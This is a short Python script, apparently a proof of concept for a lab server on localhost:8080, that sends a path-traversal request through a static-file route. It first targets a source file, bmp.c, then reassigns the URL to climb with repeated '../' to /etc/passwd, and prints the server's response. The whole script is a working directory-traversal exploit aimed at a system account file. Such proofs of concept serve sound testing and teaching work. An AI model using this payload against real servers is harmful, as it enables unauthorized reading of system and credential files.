import requests

ATTACK_URL = "http://localhost:8080/static/../bmp.c"
ATTACK_URL = "http://localhost:8080/static/../../../../../../../../../../../../../../../../etc/passwd"

if __name__ == "__main__":
    result = requests.get(ATTACK_URL)
    print(result._content)
